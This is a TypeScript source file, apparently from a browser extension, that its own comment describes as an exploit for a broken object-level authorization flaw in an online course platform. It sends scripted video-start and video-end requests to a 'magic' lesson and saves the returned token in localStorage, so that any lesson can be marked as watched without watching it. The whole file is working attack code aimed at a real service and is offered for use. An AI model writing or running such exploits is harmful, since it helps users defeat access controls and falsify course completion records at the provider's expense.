/**
 * Token Generator — exploits a BOLA vulnerability in the platform's
 * video-start / video-end validation flow.
 *
 * By sending two requests to a known "magic" lesson, we obtain a
 * universally valid token that can mark *any* lesson as watched.
 */

import { CONFIG } from '@shared/config';
import { getAuthHeaders } from '@shared/utils';
import { showToast } from '@shared/ui/toast';
import { Logger } from '@shared/utils/logger';

export class TokenGenerator {
  static async generate(): Promise<string | null> {
    // Guard: don't attempt generation if user isn't logged in
    const headers = await getAuthHeaders();
    if (!headers) {
      Logger.log('Skipping token generation — user not authenticated');
      return null;
    }

    showToast('\uD83D\uDD04 Генерирую универсальный токен...', 'info');

    try {

      const lessonId = CONFIG.magicLesson.id;
      const ts = new Date().toISOString();
      const baseBody = {
        lessonId,
        currentSpeed: 1,
        clientTimestamp: ts,
        lang: 'EN',
      };

      // Step 1 — video-start
      const startRes = await fetch(`${CONFIG.api.base}/validates/watched`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ ...baseBody, event: 'video-start' }),
      });
      if (!startRes.ok) throw new Error('Start failed');

      const startData = (await startRes.json()) as { token?: string };
      if (!startData.token) throw new Error('No token in start');

      // Step 2 — video-end (with the token from step 1)
      const endRes = await fetch(`${CONFIG.api.base}/validates/watched`, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          ...baseBody,
          event: 'video-end',
          token: startData.token,
        }),
      });
      const endData = (await endRes.json()) as { token?: string };

      if (endData.token) {
        localStorage.setItem(CONFIG.storage.videoToken, endData.token);
        Logger.success('Token generated!');
        return endData.token;
      }

      throw new Error('End failed');
    } catch (e) {
      Logger.error('Auto-generation failed:', e);
      return null;
    }
  }
}
